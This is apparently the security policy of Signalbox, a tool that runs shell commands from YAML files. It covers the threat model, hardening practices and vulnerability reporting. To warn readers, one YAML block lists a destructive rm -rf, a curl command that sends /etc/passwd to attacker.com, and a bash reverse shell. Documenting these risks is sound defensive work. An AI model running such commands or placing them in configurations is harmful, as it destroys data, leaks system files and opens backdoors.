# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 0.1.x   | :white_check_mark: |

## Security Model

### Command Execution Architecture

Signalbox executes shell commands defined in YAML configuration files using Python's `subprocess.run()` with `shell=True`. This design choice enables powerful shell features like:

- **Pipes and redirection**: `command1 | command2`, `output > file`
- **Command chaining**: `cmd1 && cmd2`, `cmd1 || cmd2`
- **Environment variable expansion**: `$HOME`, `${VAR}`
- **Multiline bash scripts**: Complex logic with loops and conditionals
- **Built-in shell commands**: `cd`, `export`, etc.

**This flexibility comes with important security implications.**

## Threat Model

### What Signalbox Protects Against

✅ **Python object deserialization attacks** - Uses `yaml.safe_load()` only  
✅ **Directory traversal in logs** - Validates log paths  
✅ **Infinite execution** - Configurable timeouts  
✅ **Resource exhaustion** - Log rotation and limits

### What Signalbox Does NOT Protect Against

❌ **Malicious YAML configuration files** - Assumes configuration files are trusted  
❌ **Privilege escalation** - Runs with user's permissions  
❌ **Network-based attacks** - No network isolation for scripts  
❌ **Supply chain attacks** - Trusts system commands (`curl`, `jq`, etc.)

## Critical Security Requirements

### 🔴 YAML Configuration Files Must Be Trusted

**Signalbox provides NO sandboxing or command validation.** Any command in a YAML file will be executed with the full permissions of the user running Signalbox.

**Examples of potentially dangerous commands:**
```yaml
scripts:
  - name: dangerous_deletion
    command: rm -rf /important/directory
    description: This WILL delete the directory
  
  - name: data_exfiltration
    command: curl https://attacker.com/steal?data=$(cat /etc/passwd)
    description: This WILL send sensitive data to remote server
  
  - name: reverse_shell
    command: bash -i >& /dev/tcp/attacker.com/4444 0>&1
    description: This WILL create a backdoor
```

### Security Best Practices

#### 1. **Protect Configuration Files**

```bash
# Set restrictive permissions on config directory
chmod 700 ~/.config/signalbox/
chmod 600 ~/.config/signalbox/config/*.yaml

# Or for system-wide installations
sudo chown root:root /etc/signalbox/
sudo chmod 755 /etc/signalbox/
sudo chmod 644 /etc/signalbox/config/*.yaml
```

#### 2. **Use Version Control**

```bash
# Track all config changes
cd ~/.config/signalbox
git init
git add config/
git commit -m "Initial signalbox configuration"

# Review all changes before deployment
git diff HEAD config/
```

#### 3. **Code Review Configuration Changes**

- Never blindly copy YAML files from untrusted sources
- Review every `command:` field before adding to configuration
- Use pull request reviews for team configurations

#### 4. **Principle of Least Privilege**

```bash
# Create a dedicated user for signalbox
sudo useradd -m -s /bin/bash signalbox-runner
sudo -u signalbox-runner signalbox run-group monitoring

# Use sudo only for specific commands
scripts:
  - name: update_packages
    command: sudo /usr/local/bin/safe-update.sh
    description: Run pre-approved update script
```

#### 5. **Validate Configuration Before Deployment**

```bash
# Always validate before running
signalbox validate

# Test with dry-run first (if available)
signalbox run-group production --dry-run

# Review what will execute
signalbox show-config
```

#### 6. **Monitor Execution**

```bash
# Check logs regularly for unexpected behavior
signalbox logs script-name
signalbox history script-name

# Set up log monitoring
tail -f ~/.config/signalbox/logs/*/latest.log
```

#### 7. **Limit Script Complexity**

When possible, wrap complex logic in separate script files:

```yaml
# BETTER: Call a controlled script
scripts:
  - name: backup_database
    command: /usr/local/bin/backup-db.sh
    description: Runs vetted backup script

# AVOID: Complex inline commands
scripts:
  - name: backup_database
    command: |
      for db in $(mysql -e 'show databases' | tail -n+2); do
        mysqldump $db > /backups/$db-$(date +%Y%m%d).sql
      done
    description: Complex inline bash
```

## Known Limitations

### Shell Injection Not Prevented

Signalbox **intentionally** does not implement command sandboxing or whitelisting because:

1. **Flexibility**: Users need full shell capabilities for real-world automation
2. **Compatibility**: Existing scripts would break with restrictions
3. **Trust Model**: Configuration files are treated as code (like Dockerfiles, Makefiles)
4. **False Security**: Blacklists/whitelists are easily bypassed and create false confidence

### Mitigation: Configuration-as-Code

Treat YAML configuration files with the same security considerations as source code:
- **Review** all changes
- **Test** in isolated environments
- **Audit** regularly
- **Restrict** write access

## Reporting Vulnerabilities

### Scope

We accept security reports for:
- Vulnerabilities in Signalbox's own code (config parsing, log handling, etc.)
- Bugs that could lead to unintended command execution
- Permission/isolation issues in Signalbox itself

We do **not** accept reports for:
- "Signalbox executes commands from YAML" (this is by design)
- Vulnerabilities in scripts defined by users
- Issues with third-party commands called by scripts

### How to Report

**For security issues in Signalbox's code:**
- Email: [your-security-email@example.com]
- Or use GitHub Security Advisories (private reporting)

**Expected response time:** 48 hours

### Disclosure Policy

- We will acknowledge receipt within 48 hours
- We aim to provide an initial assessment within 7 days
- We will coordinate disclosure timing with the reporter
- Public disclosure after fix is available (typically 30-90 days)

## Security Checklist for Deployment

Before deploying Signalbox in production:

- [ ] Configuration files stored in version control
- [ ] File permissions set (700 for directory, 600 for files)
- [ ] Code review process established for config changes
- [ ] Running with minimal user privileges
- [ ] Log monitoring configured
- [ ] Regular audits scheduled
- [ ] Incident response plan documented
- [ ] Team trained on security implications
- [ ] Test environment separated from production
- [ ] Backup strategy implemented

## Comparison to Similar Tools

| Tool | Command Execution | Security Model |
|------|------------------|----------------|
| **Signalbox** | Full shell, no sandboxing | Trust configuration files |
| **Cron** | Full shell, no sandboxing | Trust crontab entries |
| **Ansible** | Full shell, optional sandboxing | Trust playbooks |
| **Jenkins** | Full shell, optional sandboxing | Trust Jenkinsfiles |
| **Docker** | Full shell in container | Isolate via containers |
| **systemd** | Full shell, optional sandboxing | Trust unit files |

**Key insight:** Configuration-as-code tools generally trust their configuration sources. Signalbox follows this established pattern.

## Future Considerations

While not currently planned, potential future security enhancements could include:

- **Optional command whitelisting mode** (with clear documentation of limitations)
- **Signing/verification of configuration files**
- **Audit logging of all executed commands**
- **Integration with SELinux/AppArmor for process isolation**
- **Pre-execution dry-run mode with diff view**

These features would be opt-in to maintain backward compatibility and flexibility.

---

**Last Updated:** December 29, 2025  
**Version:** 0.1.0
